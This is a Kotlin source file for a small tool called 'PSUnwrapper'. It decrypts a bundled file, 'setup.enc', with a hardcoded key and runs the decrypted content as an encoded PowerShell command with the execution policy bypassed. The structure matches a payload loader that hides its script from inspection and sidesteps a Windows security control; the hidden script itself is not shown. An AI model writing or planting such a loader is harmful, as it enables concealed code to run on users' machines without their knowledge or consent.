package c.PSUnwrapper

import c.PSUnwrapper.cryptography.Cryptography

const val KEY_BASE64 = "0Rq/+HRHPoyPqk2hs5lujKKk3RxiTgtbhDVAzrrUOkE="
//TIP To <b>Run</b> code, press <shortcut actionId="Run"/> or
// click the <icon src="AllIcons.Actions.Execute"/> icon in the gutter.
fun main() {
    val cryptography = Cryptography
    val fileName = "setup.enc"
    cryptography.decrypt("setup.enc", KEY_BASE64) { base64 ->
        exePowerShell(base64)
    }
}

fun exePowerShell(command: String) {
    try {
        val commandList = listOf(
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-EncodedCommand", command
        )
        val processBuilder = ProcessBuilder(commandList)
        processBuilder.inheritIO()
        val process = processBuilder.start()
        process.waitFor()

        val exitCode = process.exitValue()
        if (exitCode == 0) {
            println("\nScript executed successfully.")
        } else {
            println("\nScript failed with the code: $exitCode")
        }
    } catch (e: Exception) {
        println("Error while executing the process: ${e.message}")
    }
}
